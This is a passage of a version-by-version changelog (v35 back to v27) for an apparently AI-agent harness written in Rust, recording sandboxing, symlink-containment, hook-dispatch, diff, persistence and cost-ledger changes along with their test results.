- **M1-incomplete — `diff::hunks_for_created` / `hunks_for_deleted` non-UTF-8.** v34 only patched `hunks_for`. The two sibling functions still silently coerced non-UTF-8 bytes to `""` via `unwrap_or`, producing `Created{new_line_count: 0}` for a real-world latin-1 file. Same fix applied: non-UTF-8 → `Hunks::Binary`. Two new tests (`created_for_non_utf8_text_returns_binary`, `deleted_for_non_utf8_text_returns_binary`).
- **M3 — `subprocess::run` post-kill timeout now observable.** The 5 s `POST_KILL_REAP_TIMEOUT` block previously silently swallowed both successful and timed-out reaps. Both still surface to the caller as `(None, true)` (correct — same observable shape) but a `tracing::warn!` with the program name, child PID, and reap-timeout-ms fires when the post-kill wait itself times out, so operators can distinguish "killed and reaped clean" from "killed but the kernel hasn't released it → possible zombie".
- **M4 — dispatcher hooks run in parallel.** `Dispatcher::dispatch`'s pre/post hook loops swapped from sequential `for manifest in …` to `futures::future::join_all(...)`. N pre-tool hooks now share one round of fork/exec overhead instead of serialising it. Spec §15 warn-but-never-block is preserved (failure isolation lives inside the executor). `futures` was already a workspace dep; no new dep.
- **M5 — `OnDiskSession::save_to` + `Registry::save` fsync the parent dir.** Atomic rename guarantees content visibility but not durability of the directory entry — a power loss right after `persist` returns can roll the rename back. Both call sites now invoke a new `cfg(unix)` `fsync_dir(parent)` helper after `tmp.persist`. Windows fallback is a deliberate no-op (spec §11 doesn't target it).
- **L4 — `MockAdapter` swapped to `parking_lot::Mutex`.** Same poison-tolerance treatment as v34 gave `Ledger`. Removes the last 3 `.lock().unwrap()` patterns in the crate.
- **L5 — schema `cost_ledger.items` gains `additionalProperties: false`.** Matches the tight-contract default the rest of `schemas/session/v1.json` uses; closes the v32 S6 smell. Rust serde already rejected extras (`LedgerEntry` is a tagged enum), so this affects only non-Rust validators of the schema.
- **L6 — `spawn_blocking` panic payload preserved.** New shared helper `tools::join_error_to_tool_error(NAME, join_err)` branches on `is_panic`, downcasts the `Box<dyn Any>` payload to `&str` / `String`, and surfaces it via `stderr: "blocking pool panic: <message>"`. All 6 file tools' `.await.map_err(...)` lines consolidate into one call to the helper.
- **L7 — `Send + Sync` posture documented.** `ContextManager`, `MemoryStore`, `PlanCanvas` all gained a doc-comment note that they're not internally `Send + Sync` (no interior mutability) and need external `Arc<Mutex<_>>` for shared access.
- **L8 — `HookSet::merge_dir` emits a shadow warning.** A per-repo hook silently replacing a same-named global is now `tracing::info!`-ed with the hook name + path of the shadowing manifest. UX paper cut closed; future "why isn't my global hook firing?" debugging gets a log line to grep for.
- **L9 — `shell` tool clones the session sandbox.** Previously rebuilt the policy from scratch via `SandboxPolicy::restrictive(ctx.sandbox.repo_root())`, silently dropping `extra_read_paths` / `extra_write_paths`. Now `ctx.sandbox.clone()` preserves session extras across shell calls.
- **L10 — `HookExecutor` privacy expectation documented.** Trait doc-comment calls out that the `payload` carries tool arguments verbatim (shell command strings, paths, write contents) and that hook implementations persisting payloads must treat them as sensitive — the §12 redaction layer (when it lands) will route hook payloads through the same filter.
- **L11 — `Staging::ensure_target_inside_workspace` TOCTOU caveat documented.** The single-threaded-per-turn assumption that closes the race is now spelled out in the helper's doc, with a note that parallelising the apply step would reopen it and should switch to `openat`-style relative-fd I/O.

Verified: `cargo test -p atelier-core --lib` → **361 passed** (was 359; +2 for the two new diff tests); `cargo fmt --check` clean; `cargo clippy -p atelier-core --all-targets -- -D warnings` clean; `make check` end-to-end green.

### Rig counts
- **21 schemas / 51 artifacts / 112 tests / 11 dry-runs / 361 Rust unit tests** (was 21 / 51 / 112 / 11 / 359).

## v34 — 2026-05-16
**All remaining v32 / v33 analysis items addressed.** Closes the HIGH-severity runtime issues (blocking I/O stalling tokio, poisonable ledger lock), the MEDIUM correctness issues (non-UTF-8 diff corruption, unbounded post-kill wait), and the LOW documentation + test-hygiene drift.

- **H1 — blocking I/O moved to the blocking pool.** Every file-touching `Tool::execute` (`read_file`, `list_dir`, `grep`, `write_file`, `edit_file`, `ast_grep`) now wraps its `std::fs::*` + `walkdir` + `Staging::commit` work in `tokio::task::spawn_blocking`. The args parse + sandbox-policy clone happen on the async side (cheap); the I/O happens on the blocking pool. A `JoinError` from the blocking pool maps to `ToolError::ExecutionFailed`. Net effect: a multi-MB read or deep walk no longer pins a tokio worker thread, so the §2.5 actor inbox + broadcast bus stay responsive even under load. `shell` was already async via `subprocess::run`.
- **H2 — `Ledger` swapped from `std::sync::RwLock` to `parking_lot::RwLock`.** Removes all 8 `.expect("ledger lock poisoned")` sites. `parking_lot` doesn't poison on a panic-with-write-guard, so a single panicking tool can no longer brick every subsequent ledger read. External API unchanged. `parking_lot` added as a direct dep (already transitive via tokio).
- **M1 — `diff::hunks_for` non-UTF-8 inputs now return `Hunks::Binary`.** The prior `unwrap_or("")` silently coerced non-UTF-8 buffers into identical empty strings, returning a bogus "no diff" when two different latin-1 / shift-jis buffers were compared. New test `non_utf8_text_bytes_yield_binary_not_silent_corruption` proves the fix.
- **M2 — `subprocess::run` post-kill wait bounded.** After `start_kill`, `child.wait()` is now wrapped in `tokio::time::timeout(POST_KILL_REAP_TIMEOUT)` (5 s). A child stuck in D-state (pending uninterruptible I/O — e.g., a hung NFS mount) can ignore SIGKILL until the kernel releases it; the prior code would block the worker thread forever. Constant declared at module top with the rationale.
- **L1 — misleading `Ledger::clone` docstring removed.** Replaced with explicit "share via `Arc<Ledger>`, not by cloning" + a note that the underlying `parking_lot::RwLock` makes the ledger panic-tolerant.
- **L2 — `Discrepancy::DuplicateClaim` orthogonality documented.** The duplicate flag + per-path `Claimed`/`KindMismatch` discrepancies are intentionally both surfaced — the duplicate is a model-quality signal, the per-path comparison is a verification signal. Doc-comment makes the design explicit and points UIs at `Discrepancy::path` for grouping.
- **L3 — tool tests use the actual tempdir as `SandboxPolicy::restrictive` root.** 33 `SandboxPolicy::restrictive("/tmp/x")` sites swapped to `SandboxPolicy::restrictive(dir.path())` (or `ws.path()` for the symlink tests). Tests are now consistent with the realistic case where the workspace and sandbox root match — important because the sandbox is per-session, and tests previously got away with the mismatch only because file tools don't enforce sandbox.

Verified: `cargo test -p atelier-core --lib` → **359 passed** (was 358; +1 for the M1 non-UTF-8 test); `cargo fmt --check` clean; `cargo clippy -p atelier-core --all-targets -- -D warnings` clean; `make check` end-to-end green.

Workspace dep added: `parking_lot = "0.12"`.

### Rig counts
- **21 schemas / 51 artifacts / 112 tests / 11 dry-runs / 359 Rust unit tests** (was 21 / 51 / 112 / 11 / 358).

## v33 — 2026-05-16
**Three critical issues from the v32 deep analysis fixed.** Closes the symlink-escape bypass, wires hook execution into the dispatch lifecycle, and adds the `validate_args` trait seam.

- **C1 — symlink containment in file tools + `Staging`.** New module `crates/atelier-core/src/path_safety.rs` with `resolve_repo_path` (syntax-level; rejects absolute paths + `..`), `ensure_inside_workspace_existing` (canonicalize-and-prefix-check; catches the symlink-to-outside attack), and `ensure_inside_workspace_creatable` (same, for not-yet-existing targets). Every file-touching tool now calls the appropriate helper after `resolve_repo_path`: `read_file`, `list_dir`, `edit_file`, `write_file`, `grep`, `ast_grep`. `grep` and `ast_grep` additionally skip symlinks at the leaf — `WalkDir::follow_links(false)` only controls traversal, not whether a reported leaf is itself a symlink to outside. `Staging::commit` does its own containment check via `ensure_target_inside_workspace` (walks up to the deepest existing ancestor, canonicalizes it, asserts prefix) so direct `Staging` callers also get the guarantee. 10 new unit tests covering symlink-to-outside in both file and directory positions, repo-internal symlinks still accepted, missing files / missing parents.
- **C2 — `HookExecutor` actually fires from `Dispatcher::dispatch`.** Dispatcher gains `executor: Arc<dyn HookExecutor>` (default `NoopHookExecutor`) + `Dispatcher::with_executor` builder. `dispatch` now: lookup → validate_args → **pre-tool hooks** → execute → build outcome → **post-tool hooks** → return. Per spec §15 "warn-but-never-block", the executor's own time-budget + error logging stays inside the executor; the dispatcher just `.await`s. Pre-tool payload = `{event, tool_name, tool_call_id, arguments}`; post-tool payload adds `{ok, error_kind?}` so a hook can act on outcomes. 3 new unit tests with a recording mock executor verify both phases fire in order, payload shape is correct, and unknown-tool short-circuits before any hook runs.
- **C3 — `Tool::validate_args` trait seam.** New trait method `validate_args(&self, args: &serde_json::Value) -> Result<(), String>`; default `Ok(())`. Dispatcher calls it between lookup and pre-tool hooks; `Err(msg)` short-circuits with `ToolError::SchemaViolation` (ledger entry recorded, no hooks fire, no execute attempted). **Built-in tools rely on the default** because their `execute` impls deserialise via `#[serde(deny_unknown_fields)]` typed structs that produce `SchemaViolation` on shape errors — equivalent to running the bundled manifest's `input_schema` for the constraints those manifests express (types, required, enums, unknown fields). The seam is built so MCP-routed tools and any future built-in with constraints serde can't express (regex, length bounds, `oneOf`/`anyOf` semantics) plug in a real JSONSchema validator without dispatcher churn. 1 new dispatcher test proves the gate fires before execute and hooks.

**Why no `jsonschema` dep was added.** The workspace's `jsonschema = "0.26"` pin transitively requires `icu_*` 2.x which requires rustc 1.86+; we're pinned 1.85.0. The honest fix is the trait-seam-with-serde-fallback above; bumping toolchain or downgrading `jsonschema` to a non-icu version would be its own commit with its own scope.

**Drive-by:** `tools/grep.rs` and `tools/ast_grep.rs` use the canonical walk root (`&root`) for `strip_prefix` of reported paths, not `ctx.workspace_root` — the canonical and uncanonical forms differ on macOS (`/var/folders/...` vs `/private/var/folders/...`) and the prior code accidentally returned absolute paths when they mismatched.

Verified: `cargo test -p atelier-core --lib` → **358 passed** (was 344; +14 across path_safety + symlink tests in read_file/grep + Staging containment test + dispatcher's three new hook-execution tests + validate_args gate test); `cargo fmt --check` clean; `cargo clippy -p atelier-core --all-targets -- -D warnings` clean; `make check` end-to-end green.

### Rig counts
- **21 schemas / 51 artifacts / 112 tests / 11 dry-runs / 358 Rust unit tests** (was 21 / 51 / 112 / 11 / 344).

## v32 — 2026-05-16
**Phase C UI unblockers — four follow-ons + the seven built-in tools land.** Closes the loop on the three honest call-outs from v31 (subprocess+sandbox plumbing extracted, dispatcher's pure/wrapped split made explicit, gui bootstrap docs split into decisions vs. mechanical) and ships the §15 built-in tool implementations.

- **`crates/atelier-gui/README.md`** rewritten as a D1–D4 decisions table (each row: choice / why it matters / safe default) plus an M1–M6 mechanical-steps table. D1 (bundle id) flagged irreversible-for-codesign; D3 (frontend stack) flagged load-bearing-once-chosen. New anti-bootstrap entry: don't build a `SessionViewModel` aggregator in `atelier-core` before the frontend exists.
- **Shared subprocess+sandbox+timeout helper** (`crates/atelier-core/src/subprocess.rs`). `run(program, args, &SubprocessSpec) -> SubprocessOutcome { exit_code, stdout, stderr, duration_ms, timed_out }` spawns under `tokio::process::Command`, drains stdout + stderr in concurrent reader tasks (no pipe-deadlock), times out via `tokio::time::timeout` → SIGKILL → reap. `sandboxed_argv(argv, &SandboxPolicy)` returns the platform-specific `(program, wrapped_args)` pair: macOS = `("sandbox-exec", ["-p", profile, "--", argv...])`, Linux = `("bwrap", linux_bwrap_argv(policy, argv))`, other = `SubprocessError::UnsupportedPlatform`. CI doesn't install `bubblewrap`, so the test suite uses bare `run` against `echo`/`sh -c` (no sandbox dep); cfg-gated tests exercise the wrapped path on macOS where `sandbox-exec` is always present.
- **`SessionDispatcher`** (`crates/atelier-core/src/dispatcher.rs`). Thin wrapper around the pure `Dispatcher`; owns `Arc<Ledger>` + `broadcast::Sender<Event>` and performs the two side effects after each dispatch (`ledger.append` + `for ev in events { sender.send(ev) }`). Pure `Dispatcher` stays the unit-test surface. `Sender::send` returning Err for "no subscribers" is silently swallowed — headless runs don't surface dispatcher errors when no UI is attached. `Handle::events_sender()` newly exposed so the wiring code can plumb the cloned `Sender` in at session start.
- **`crates/atelier-core/src/tools/`** — seven `Tool` impls + a shared `resolve_repo_path` helper enforcing "repo-relative, no `..`, no absolute" uniformly:
  - `read_file` — offset/length window with truncation flag.
  - `list_dir` — sorted entries, dot-files hidden by default.
  - `grep` — regex via `regex` crate; walks via `walkdir`; skips dot-dirs / binary (NUL-in-8KB) / files >1 MB; tempdir-prefix workaround for `filter_entry` rejecting roots starting with `.tmp`.
  - `write_file` — routes through `Staging::commit`; staged-writes report flows into `Event::EditStaged`.
  - `edit_file` — anchor-based patch; rejects ambiguous anchors; routes through `Staging` with `expected_pre_hash` for §14 concurrent-edit detection.
  - `ast_grep` — `kind:<node-kind>` patterns over bundled `tree-sitter-json`; richer pattern syntax + other Tier-1 grammars land alongside §7 hallucination detector.
  - `shell` — `sh -c` via `subprocess::sandboxed_argv` + `subprocess::run`; cwd is repo-relative; `allow_net` derives a fresh `with_net` policy.
- **`ShellHookExecutor`** (dispatcher.rs) — concrete `HookExecutor` impl spawning the hook's `command` via `sh -c` inside the session sandbox, forwarding the hook payload as `ATELIER_HOOK_PAYLOAD` env-var. Warns past `time_budget_ms` via `tracing` but **never blocks** (spec §15). Non-shell impls log + skip.

**Drive-by fix in `sandbox::macos_profile`** — now `(import "system.sb")`s Apple's baseline profile so subprocess loading actually works inside the sandbox. Without this, the hand-rolled enumeration of allowed paths was incomplete and `sandbox-exec` killed children with SIGABRT during dyld setup. Test asserts the import precedes `(deny default)` so the explicit restrictions still override the baseline's allows.

Workspace deps added: `regex = "1.11"`, `walkdir = "2.5"`.

Verified: `cargo test -p atelier-core --lib` → **344 passed** (was 289; +55 across subprocess + SessionDispatcher + tools/ + ShellHookExecutor); `cargo fmt --check` clean; `cargo clippy -p atelier-core --all-targets -- -D warnings` clean; `make check` end-to-end green (21/21 schemas, 51/51 artifacts, 112 rig tests, 11/11 canonical dry-runs).

Explicitly **not done this round** — tracked as the remaining Phase C UI unblocker:
- §1 Anthropic adapter against the real Messages API. Trait + `MockAdapter` (v31) and dispatcher + built-in tools (this rev) leave it as a self-contained piece: SSE streaming + native tool-use channel + `wiremock`/recorded-fixture-based tests (no live API in CI).

### Rig counts
- **21 schemas / 51 artifacts / 112 tests / 11 dry-runs / 344 Rust unit tests** (was 21 / 51 / 112 / 11 / 289).

## v31 — 2026-05-16
**Phase C UI unblockers — first three of five.** Spec §"Phased build plan" Phase C section was extended in v30 to spell out the five unblockers; this rev lands items 1–3 (the trait + ledger + dispatcher skeleton). Items 4 (seven built-in tool impls) and 5 (Anthropic adapter against the real Messages API) follow in their own commits — bundling them here would produce shallow stubs against my prior pattern of one substantial module per round.

- **§1 BYOM adapter trait** (`crates/atelier-core/src/adapter.rs`). Async `Adapter` trait: `model_id / capabilities / conformance / count_tokens / chat / stream`. `chat` has a default impl in terms of `stream` so streaming-only providers cost nothing extra. `Capabilities { native_tool_use, streaming, vision, prompt_cache, structured_output, long_context, context_window_tokens }`; `CapabilityClaim::{Supported, ClaimedButBroken, Unsupported}` flags the "claimed-but-broken" trap state from spec §1's matrix. `AdapterError` covers `ContextOverflow / Auth / Unreachable / Malformed / RateLimited / Provider / NotConfigured`; `requires_user_decision()` maps each to the §2.5 `Recovery` routing. `Message / Role / ToolSpec / ToolCallRequest / ChatResponse / Usage / StreamChunk::{Text, ToolCallStarted, ToolCallDelta, ToolCallCompleted, Complete, Error}` all round-trip through serde. `MockAdapter` queues a FIFO of `ChunkStream`s + has a `with_context_window` knob that fires `ContextOverflow` deterministically; `record_conformance` lets tests assert the matrix-vs-ring-buffer interaction. Workspace dep added: `async-trait`.
- **§1 typed cost ledger** (`crates/atelier-core/src/ledger.rs` + retypes `OnDiskSession.cost_ledger`). `LedgerEntry::{ModelCall, ToolCall, CacheBust}` enforces the schema's per-kind required fields at compile time (cannot construct a `ToolCall` without `tool_name`/`latency_ms`, a `ModelCall` without `model_id`/`prompt_tokens`/etc.). `Ledger` is append-only, `RwLock`-backed; `append / to_vec / from_vec / by_kind / total_cost_usd / total_tokens / entries_without_cost` (latter so the §3 cost meter renders "$1.23 + N unknown" rather than understating). Helpers: `LedgerEntry::tool_call(...)`, `LedgerEntry::cache_bust_from(&CacheBustEvent)` bridges the §5 context manager's eviction event into a ledger entry without `context.rs` importing the ledger. `local_cost_usd(latency_ms, rate)` + `DEFAULT_LOCAL_RATE_USD_PER_SEC = $0.00028/sec` (spec §1 PROVISIONAL). `OnDiskSession.cost_ledger: Vec<serde_json::Value>` → `Vec<LedgerEntry>`; all 4 bundled session examples still round-trip.
- **§15 tool dispatcher skeleton** (`crates/atelier-core/src/dispatcher.rs`). Async `Tool` trait (`name`, `side_effect_class`, `execute(args, &ToolContext)`); `ToolRegistry` keyed by name with sorted iteration + duplicate-name rejection. `Dispatcher::dispatch` walks the per-tool-call lifecycle: lookup tool → identify pre-tool / post-tool hooks via `HookSet::for_tool_event` → execute → translate any `staged_writes: CommitReport` into per-file `Event::EditStaged` via the `edit_staged_events` helper (already built in v30) → build a `LedgerEntry::ToolCall` with measured latency + local cost. Returns a `DispatchOutcome` — pure (no side effects); the caller appends to the ledger + broadcasts events. Failed dispatches still produce a ledger entry; unknown tool names fail closed with `ToolError::ExecutionFailed` so the harness can never silently no-op a model-emitted call. `SideEffectClass::{LocalSafe, LocalRisky, SharedState, Irreversible}` with `budget_cost()` matching spec §8 PROVISIONAL (0/1/20/20). `HookExecutor` trait + `NoopHookExecutor` sketched; real subprocess execution lands with item 4's tool-impls follow-on (it shares the §11 sandbox launcher those tools need).

Verified: `cargo test -p atelier-core --lib` → **289 passed** (was 242; +47 across the three new modules); `cargo fmt --check` clean; `cargo clippy -p atelier-core --all-targets -- -D warnings` clean; `make check` end-to-end green (21/21 schemas, 51/51 artifacts including session round-trips of the now-typed `cost_ledger`, 112 rig tests, 11/11 canonical dry-runs).

Explicitly **not done this round** — each is tracked in `tasks/todo.md` as the remaining Phase C UI unblockers:
- §15 built-in tool implementations (`read_file`, `write_file`, `edit_file`, `list_dir`, `grep`, `ast_grep`, `shell`). Each gets its own module; the dispatcher already accepts them via the `Tool` trait. Lands across multiple commits.
- §1 Anthropic adapter against the real Messages API. Needs SSE streaming + tool-use channel + `wiremock`/recorded-fixture-based tests (no live API in CI). The trait + `MockAdapter` this rev landed make this self-contained.
- Real **hook subprocess execution** (the `HookExecutor` concrete impl) — pairs naturally with the `shell` tool impl since both wrap `tokio::process` inside the §11 sandbox.

### Rig counts
- **21 schemas / 51 artifacts / 112 tests / 11 dry-runs / 289 Rust unit tests** (was 21 / 51 / 112 / 11 / 242).

## v30 — 2026-05-16
**Phase C data-layer prerequisites — four typed APIs the UI will consume.** Lays the data underneath the Phase C UI work without touching the GUI/TUI bootstrap. Spec §"Phased build plan" Phase C section was extended to spell out these prerequisites explicitly.

- **§5 context manager** (`crates/atelier-core/src/context.rs`). `ContextItem { id, payload, tokens: TokenCount{count,source}, provenance, pinned, added_at, last_used }`. `Payload::{FileRef, InlineText, BlobRef}` covers the three concrete shapes the workspace renders; `Provenance::{Initial, UserAttached, ToolResult, MemoryPromoted, PinnedByUser}` carries the why-here trace. `ContextManager` insertion-ordered with `add / pin / unpin / evict / touch / iter / token_snapshot`. `evict` refuses pinned items and returns a `CacheBustEvent` the caller forwards to the §1 cost ledger as `kind: cache_bust` — keeps the module pure of I/O. `TokenSnapshot` separates known from `Unavailable` so the §5 token meter never silently underreports.
- **§5 typed memory** (`crates/atelier-core/src/memory.rs` + retypes `OnDiskSession.memory`). `MemoryCard` matching the schema exactly (`id, content, created_at, last_used, pinned?`); `MemoryStore` with `add / touch / pin / unpin / evict / promote_to_global`. `promote_to_global` returns `PromoteOutput { relative_path, bytes }` for the caller to write (same purity discipline as `context.rs`). `OnDiskSession.memory: Vec<serde_json::Value>` → `Vec<MemoryCard>`; all 4 bundled session examples still round-trip and `make artifacts` validates them.
- **§5 typed plan** (`crates/atelier-core/src/plan.rs` + retypes `OnDiskSession.plan.steps`). `PlanStep { id, text, status, constraints? }` + `PlanStatus::{Pending, InProgress, Done, Skipped}`. `PlanCanvas` with auto-id `add`, `insert` (rejects duplicates, advances next-serial past imported `step-N` ids), `remove`, `mark_status / mark_done / mark_skipped`, idempotent `add_constraint`, and `reorder` that validates membership before mutating. `apply_envelope(&PlanUpdate) -> ApplyReport` consumes the §2 envelope's `plan_update` field (best-effort text-match for `complete`/`remove`; `reorder` from an envelope is intentionally dropped with a UI-visible reason). `OnDiskSession.plan.steps: Vec<serde_json::Value>` → `Vec<PlanStep>`.
- **Incremental diff stream** (`crates/atelier-core/src/diff.rs` + `staging::FileOutcome.hunks` + `session::Event::EditStaged`). `Hunks::{Same, Lines{hunks}, Binary, Created, Deleted}` via the `similar` crate. Binary detection uses §14's "NUL in first 8 KB" rule so the diff layer and the §14 diff-blob store agree. `staging::Staging::commit` now reads the pre-image once per file (for both conflict check and hunk extraction; race-free) and stamps the `Hunks` onto every `FileOutcome`. `session::Event::EditStaged { path, hunks }` is the §3 "live diff updates as the agent edits" carrier; `session::edit_staged_events(&CommitReport)` is the pure translator the tool dispatcher will call to forward each commit's per-file events onto the bus.

Workspace deps added: `similar = "2.7"`.

Verified: `cargo test -p atelier-core --lib` → **242 passed** (was 172; +70 across the four new modules); `cargo fmt --check` clean; `cargo clippy -p atelier-core --all-targets -- -D warnings` clean; `make check` end-to-end green (21/21 schemas, 51/51 artifacts including round-trips of the retyped session memory + plan fields, 112 rig tests, 11/11 canonical dry-runs).

Explicitly **not done this round** — each is tracked in `tasks/todo.md`:
- Phase C UI itself — `cargo tauri init` and TUI widgets still need the interactive bootstrap and an adapter producing real envelopes. The data layer this rev landed is what those UIs will consume.
- §5 non-destructive compaction with cost disclosure + mental-model panel — defers until the GUI work begins.
- §5 mechanical gate (context-panel API assertions; cache-bust ledger entry on eviction) — needs the eventual UI to assert against; the underlying ops + `CacheBustEvent` data are in place and unit-tested.

### Rig counts
- **21 schemas / 51 artifacts / 112 tests / 11 dry-runs / 242 Rust unit tests** (was 21 / 51 / 112 / 11 / 172).

## v29 — 2026-05-16
**Phase B foundation — §2 protocol + §7 verification (subset, code-first).** Five modules land. Phase B's real-model conformance gate (≥95% on canonical workload across Anthropic + OpenAI) still needs §1 adapters; everything that can be built as a pure data layer is now built and tested.

- **§2 envelope types** (`crates/atelier-core/src/protocol.rs`). Typed `Envelope` mirroring `schemas/model_protocol/envelope.v1.json` with `serde(deny_unknown_fields)`. Round-trips all three bundled `prompts/protocol_fewshot/` examples. Runtime validates the schema's `maxLength: 500` summary cap (JSON Schema's runtime cost in the rig is paid here too). Every optional field is `Option<_>` so absent vs. default is type-distinct — enforces spec §2 "never silently substitute 'everything OK.'"
- **§2 three emission strategies** (`crates/atelier-core/src/protocol_strategy.rs`). `Strategy::{NativeTool, JsonSentinel, RegexProse}` with `downshift()` chain. Each strategy has an `encode`/`parse` pair. `parse_json_sentinel` returns `(envelope, prose)` so UI renders the two streams separately. The regex-prose fallback is deliberately lossy per spec (drops `plan_update` and `constraints_acknowledged`); both round-trip absent on re-parse, surfacing as gray badges in the UI.
- **§2 conformance tracker** (`crates/atelier-core/src/protocol_conformance.rs`). `TurnConformance` issues `TurnDecision::{Reprompt, Downshift, EscalateToUser}` — `Reprompt` 3× per strategy, then downshift, then escalate at the bottom of the stack. Cross-call `ConformanceRingBuffer` (capacity 100, PROVISIONAL) for the §1 `Adapter::conformance()` window with `snapshot()` returning per-strategy success counts.
- **§7 did-it-do-what-it-said** (`crates/atelier-core/src/verify.rs`). Pure function `compare(envelope, &[ObservedChange]) -> Vec<Discrepancy>`. Detects: claimed-but-not-observed, observed-but-not-claimed, kind-mismatch (e.g. claimed delete + observed modify), duplicate claims. Lying-agent gate's primary signal.
- **§7 DoD config** (`crates/atelier-core/src/dod.rs` + `schemas/config/dod.v1.json` + `examples/config/dod.v1.json`). `DodConfig` loader with `(name, tier, command, working_dir, timeout_ms, expect, tags)` checks. Tier enum matches spec §7 (`test / typecheck / lint / build / custom`). Discovery: per-repo `<repo>/.atelier/dod.json` overrides global `~/.atelier/dod.json`; missing both is a soft no-config state. Validates name regex (shared with hook names), absolute / `..`-escaping `working_dir`, zero timeouts, and unknown fields. Schema-validated end-to-end by the rig.

Verified: `cargo test -p atelier-core --lib` → **172 passed** (was 97; +75 across the five new modules); `cargo fmt --check` clean; `cargo clippy -p atelier-core --all-targets -- -D warnings` clean; `make check` end-to-end green (**51/51 artifacts** including the new DoD example, **112 rig tests**, **11/11 canonical dry-runs**).

Explicitly **not done this round** — each is tracked in `tasks/todo.md`:
- §2 nightly protocol-overhead measurement harness + `ci/nightly/protocol_overhead.yml` — gated on adapter to drive real model calls.
- §2 per-adapter few-shot override hook — defers to the BYOM adapter trait (§1).
- §2 real-model conformance gate (Anthropic + OpenAI canonical workload ≥95%) — needs Phase A adapters.
- §7 Tier-1 hallucination detector (TypeScript LSP) — gated on Q3 (LSP auto-install UX) + `tower-lsp` integration.
- §7 lying-agent and hallucinating-agent mechanical gates — same; pure-function detector code is in place and unit-tested.

### Rig counts
- **21 schemas / 51 artifacts / 112 tests / 11 dry-runs / 172 Rust unit tests** (was 20 / 50 / 112 / 11 / 97).

## v28 — 2026-05-16
**Phase A foundation — five unblocked modules land in `atelier-core`.** Wires up the runtime mechanics that Phase A's mechanical gate hangs off, without taking on the items blocked by external actions (rmcp spike Q7, baseline capture Q5).

- **§2.5 session actor** (`crates/atelier-core/src/session.rs`). Per-session tokio task with `mpsc` inbox, `broadcast` event channel, bounded `Semaphore` (cap 4, PROVISIONAL) for in-turn tool parallelism, and `tokio_util::CancellationToken` for drop-on-cancel. Every transition goes through `Transition::new` (validates against `LEGAL_TRANSITIONS`) and fires `CheckpointHook` + `LedgerHook` before broadcast. Illegal transitions surface as `Event::IllegalTransitionAttempted` rather than panic. Terminal states (`Done`, `Failed`) end the actor.
- **§3 atomic diff staging** (`crates/atelier-core/src/staging.rs`). `Staging::commit` stages every write into a same-filesystem `TempDir`, runs the syntax check + SHA-256 pre-hash conflict check, then lexicographically renames. Any validation failure leaves the workspace untouched. `TreeSitterSyntaxCheck` bundles `tree-sitter-json` and reports `Pass / Fail / NotApplicable / GrammarMissing` per spec §3 (other Tier-1 extensions return `GrammarMissing` until their grammars are bundled). Absolute paths and `..` escapes are rejected at `add` time.
- **§11 sandbox profile generators** (`crates/atelier-core/src/sandbox.rs`). `macos_profile(&SandboxPolicy)` emits a `(deny default)` `sandbox-exec` `.sb` profile; `linux_bwrap_argv` emits the bubblewrap argv with `--unshare-net/-pid/-uts/-ipc/-user-try`, tmpfs `/tmp`, RO bind for `/usr`, `/lib`, `/bin`, `/sbin`, `/etc`, and `--die-with-parent`. Network is denied by default; `with_net()` flips both platforms. Writes to `/etc` and `/usr/local` are rejected at policy-build time per spec §11.
- **§14 crash-recovery scaffold** (`crates/atelier-core/src/persistence.rs`). Typed `OnDiskSession` matching `schemas/session/v1.json`; atomic `save_to` via `tempfile::NamedTempFile::persist`; `load_from` rejects mismatched `harness_session_version` with a typed error. `RecoveryEntry` + `RecoveryReason::{Crash, UserCancel, Timeout, ConcurrentEditPause}` + `append_recovery`. Global `Registry` at `~/.atelier/registry.json` with `touch / forget / save / load` (missing file = empty per spec).
- **§15 hook manifest loader** (`crates/atelier-core/src/hooks.rs`). `HookManifest::from_json` round-trips `schemas/config/hook_manifest.v1.json` and enforces the runtime invariants serde can't (`version == 1`, `name` regex, `time_budget_ms >= 1`, `tool_filter` not set for `on-verify-*`, non-empty command/url). `HookSet::load_dir` + `merge_dir` give per-repo-overrides-global discovery. `HookApprovals` is the first-use approval store with atomic save under `_approvals.json` (`_` prefix keeps it out of the name regex space) and a `partition` helper for the UI prompt.

Workspace deps added: `sha2`, `tree-sitter`, `tree-sitter-json`, `uuid`. `atelier-core` now depends on `tokio`, `tokio-util`, `futures`, `tracing`, `uuid`, `tempfile`, `sha2`, `tree-sitter`, `tree-sitter-json`.

Verified: `cargo test -p atelier-core --lib` → **97 passed** (was 21; +76 across the five new modules); `cargo fmt --check` clean; `cargo clippy -p atelier-core --all-targets -- -D warnings` clean; `make check` end-to-end green (`50/50 artifacts`, `112 passed`, `11/11 dry-runs OK`).

Explicitly **not done this round** — each is tracked in `tasks/todo.md`:
- File-watcher integration (§14) — needs the tool dispatcher's read-set tracking.
- Concurrent-edit modal flow (§14) — UX surface; queues at tool-call boundary.
- Hook execution (§15) — subprocess wrapper lands with the §15 tool dispatcher.
- Diff-blob storage (§4) — bundled with checkpoint store.
- Anthropic / LiteLLM adapters (§1) — Q2 is resolved but the adapters are a multi-session block of their own.
- MCP client (§15) — gated on Q7 rmcp spike.

### Rig counts
- **20 schemas / 50 artifacts / 112 tests / 11 dry-runs / 97 Rust unit tests** (was 21).

## v27 — 2026-05-16
**Onboarding fixes: README CI badge URL + `make install-rig` on Homebrew Python.** Two unrelated friction points hit on a fresh checkout, plus one latent packaging bug surfaced by the second fix.

- **README CI badge URL.** Placeholder `OWNER` in the `github.com/OWNER/atelier/...` badge URL replaced with `ChrisAdkin8`. The accompanying "replace `OWNER` once the repo lives on GitHub" comment is removed. Resolves the placeholder noted in v3 (CHANGELOG line 310, preserved as a historical record).
- **`make install-rig` now uses a project-local venv.** On macOS Homebrew Python (PEP 668 externally-managed), `pip install --user ".[rig]"` is refused. The target now creates `.venv/` (if absent) and installs the rig deps into it. Other Make targets pick up `.venv/bin/python` via a new `VENV_PY` detection in the Makefile and fall back to system `python3` — so CI (which installs deps directly per `.github/workflows/check.yml`) is unaffected. `.venv/` added to `.gitignore`.
- **`pyproject.toml [tool.setuptools] packages = []`.** Latent bug surfaced once the install actually built a wheel: setuptools' auto-discovery picked up sibling dirs (`crates/`, `target/`, `schemas/`, `prompts/`, `experiments/`) as top-level packages and refused to build. The rig has no importable Python module — it's scripts under `tests/` run via `python3 tests/...` — so the correct fix is to declare zero packages explicitly.
- **Docs synced**: `README.md` (install-rig blurb), `CONTRIBUTING.md` (dev-loop comment), `ATELIER.md` (canonical-commands blurb).

